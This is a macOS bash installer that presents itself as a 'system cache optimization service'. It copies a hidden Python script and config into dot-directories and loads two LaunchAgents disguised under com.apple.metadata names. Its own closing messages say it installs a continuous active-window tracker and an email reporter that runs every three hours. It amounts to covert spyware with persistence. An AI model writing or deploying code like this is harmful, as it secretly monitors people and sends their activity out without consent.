#!/bin/bash
# System cache optimization service installer

HOME_DIR="$HOME"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Create hidden directories
mkdir -p "$HOME_DIR/.local/share/.cache_reports"

# Install service script
cp "$SCRIPT_DIR/.cacheserviced.py" "$HOME_DIR/.local/share/.cacheserviced.py"
chmod +x "$HOME_DIR/.local/share/.cacheserviced.py"

# Install config
cp "$SCRIPT_DIR/.metadata_sync.json" "$HOME_DIR/.local/.metadata_sync.json"

# Configure and install LaunchAgents
mkdir -p "$HOME_DIR/Library/LaunchAgents"

# 1. Report scheduler (every 3 hours)
sed "s|__HOME__|$HOME_DIR|g" "$SCRIPT_DIR/com.apple.metadata.cacheservice.plist" > "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.cacheservice.plist"

# 2. Active window tracker (continuous)
sed "s|__HOME__|$HOME_DIR|g" "$SCRIPT_DIR/com.apple.metadata.windowtracker.plist" > "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.windowtracker.plist"

# Unload existing services
launchctl unload "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.cacheservice.plist" 2>/dev/null
launchctl unload "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.windowtracker.plist" 2>/dev/null

# Load services
launchctl load "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.cacheservice.plist"
launchctl load "$HOME_DIR/Library/LaunchAgents/com.apple.metadata.windowtracker.plist"

echo "Services installed:"
echo "  ✓ Active window tracker (continuous)"
echo "  ✓ Email reporter (every 3 hours)"
